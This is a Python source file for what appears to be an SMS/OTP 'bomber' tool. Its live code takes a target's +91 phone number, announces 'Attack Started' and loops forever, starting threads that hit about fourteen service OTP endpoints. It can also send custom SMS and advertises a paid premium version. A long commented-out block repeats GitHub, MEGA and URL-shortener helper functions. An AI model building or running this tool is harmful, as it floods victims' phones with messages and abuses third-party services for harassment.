        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''






class Samay(Database):
    def __init__(self,users_data):
        self.User_data = users_data

    def Function_Option_1(self):
        if self.User_data == 1:
            if self.HideNumber_Status:
                self.arrange_hide_Format = str(self.NumberInput_bomb)
                self.final_hide_Format = (Fore.MAGENTA+'********' + Fore.GREEN + self.arrange_hide_Format[8:10])
                print(gg+"  └─"+w+"\033[1;37m"+Fore.YELLOW+'Attack Started '+Fore.BLUE+'|'+Fore.YELLOW+' Number '+Fore.RED+'>>> '+self.final_hide_Format)
            else:
                print(gg+"  └─"+w+"\033[1;37m"+Fore.YELLOW+'Attack Started '+Fore.BLUE+'|'+Fore.YELLOW+' Number '+Fore.RED+'>>> '+Fore.GREEN+str(self.NumberInput_bomb))

            backslash()
            print('     [+] Press ctrl + c to Stop [+] ')
            try:
                while True:
                    Thread(target=super().Bjp_saral()).start()
                    Thread(target=super().railmadad()).start()
                    Thread(target=super().adda()).start()
                    Thread(target=super().striker()).start()
                    Thread(target=super().tractor()).start()
                    Thread(target=super().byjus()).start()
                    Thread(target=super().Mycircle()).start()
                    Thread(target=super().naturebasket()).start()
                    Thread(target=super().Shadowapi()).start()
                    Thread(target=super().aakash()).start()
                    Thread(target=super().pospe()).start()
                    Thread(target=super().payrup()).start()
                    Thread(target=super().Rummyculture()).start()
                    Thread(target=super().rummycircle()).start()
                    

            except KeyboardInterrupt as samay:
                AlwaysBanner()
                self.autothing = True
                self.datafiles = Samay(self.autothing)
                self.datafiles.returnbhai()


        elif self.User_data == 2:
            if self.HideNumber_Status:
                self.arrange_hide_Format = str(self.NumberInput_bomb)
                self.final_hide_Format = (Fore.MAGENTA+'********' + Fore.GREEN + self.arrange_hide_Format[8:10])
                self.nighsin = super().CustomSms()
                if self.nighsin:
                    print(gg+"  └─"+w+"\033[1;37m"+Fore.YELLOW+'Message Send Successfully '+Fore.BLUE+'|'+Fore.YELLOW+' Number '+Fore.RED+'>>> '+self.final_hide_Format)
                    backslash()
                    super().returnbhai()
                else:
                    AlwaysBanner()
                    Type('Error 201 ...')
                    backslash()
                    super().returnbhai()

            else:
                self.nighsin = super().CustomSms()
                if self.nighsin:
                    print(gg+"  └─"+w+"\033[1;37m"+Fore.YELLOW+'Message Send Successfully '+Fore.BLUE+'|'+Fore.YELLOW+' Number '+Fore.RED+'>>> '+Fore.GREEN+str(self.NumberInput_bomb))
                    backslash()
                    super().returnbhai()
                else:
                    AlwaysBanner()
                    Type('Error 201 ...')
                    backslash()
                    super().returnbhai()




                




if __name__ == '__main__':
    TeamSincryption = Samay(users_data)
    AlwaysBanner()
    if users_data == 1:
        TeamSincryption.HideNumber = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Do you want to Hide Number [y/n] : "+r).strip()
        if TeamSincryption.HideNumber == 'y' or TeamSincryption.HideNumber == 'Y':
            TeamSincryption.HideNumber_Status = True
        else:
            TeamSincryption.HideNumber_Status = False
        AlwaysBanner()
        if TeamSincryption.HideNumber_Status:
            TeamSincryption.NumberInput_bomb = pwinput(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter the number +91 : "+Fore.GREEN,'*').strip()
            if len(str(TeamSincryption.NumberInput_bomb)) >= 11:
                Number10DigitError()
                
            elif len(str(TeamSincryption.NumberInput_bomb)) < 10:
                Number10DigitError()
        else:
            TeamSincryption.NumberInput_bomb = int(input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the number +91 : "+Fore.GREEN))
            if len(str(TeamSincryption.NumberInput_bomb)) >= 11:
                Number10DigitError()
                
            elif len(str(TeamSincryption.NumberInput_bomb)) < 10:
                Number10DigitError()

    elif users_data == 2:
        TeamSincryption.HideNumber = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Do you want to Hide Number [y/n] : "+r).strip()
        if TeamSincryption.HideNumber == 'y' or TeamSincryption.HideNumber == 'Y':
            TeamSincryption.HideNumber_Status = True
        else:
            TeamSincryption.HideNumber_Status = False
        AlwaysBanner()
        if TeamSincryption.HideNumber_Status:
            TeamSincryption.NumberInput_bomb = pwinput(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter the number +91 : "+Fore.GREEN,'*').strip()
            
            if len(str(TeamSincryption.NumberInput_bomb)) >= 11:
                Number10DigitError()
                
            elif len(str(TeamSincryption.NumberInput_bomb)) < 10:
                Number10DigitError()
            TeamSincryption.msg = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the custom msg : "+r).strip()
            if len(str(TeamSincryption.msg)) >= 25:
                AlwaysBanner()
                Type(Fore.YELLOW+'You can Only Put 24 Words in Custom msg Please check the lenghth of word and try again ....')
                backslash()
                TeamSincryption.returnbhai()

        else:
            TeamSincryption.NumberInput_bomb = int(input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the number +91 : "+Fore.GREEN))
            if len(str(TeamSincryption.NumberInput_bomb)) >= 11:
                Number10DigitError()
                
            elif len(str(TeamSincryption.NumberInput_bomb)) < 10:
                Number10DigitError()
            TeamSincryption.msg = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the custom msg : "+r).strip()
            if len(str(TeamSincryption.msg)) >= 17:
                AlwaysBanner()
                Type(Fore.YELLOW+'You can Only Put 17 Words in Custom msg Please check the length of word and try again ....')
                backslash()
                TeamSincryption.returnbhai()

    elif users_data == 3:
        AlwaysBanner()
        Type('Buy Premium Script | Instagram : @sincryptzork | telegram : @sincryptzork')
        backslash()
        TeamSincryption.returnbhai()

    elif users_data == 4:
        os.system('python update.py' if os.name=='nt' else 'python3 update.py')
        sys.exit()
    else:
        AlwaysBanner()
        Type('Exited ....')
        backslash()
        sys.exit()

        

    TeamSincryption.Function_Option_1()
    backslash()
    
        



        
